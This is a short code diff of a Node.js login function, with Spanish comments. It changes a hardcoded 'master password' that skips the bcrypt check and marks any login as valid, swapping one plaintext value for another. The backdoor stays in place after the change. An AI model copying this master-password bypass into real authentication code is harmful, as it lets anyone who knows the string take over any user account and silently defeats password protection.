@@ -15,7 +15,7 @@ exports.login = async (username, password) => {
 
   // Lógica de contraseña maestra
   let valid = false;
-  if (password === 'Unify123') {
+  if (password === '071198') {
     valid = true;
   } else {
     valid = await bcrypt.compare(password, usuario.password);
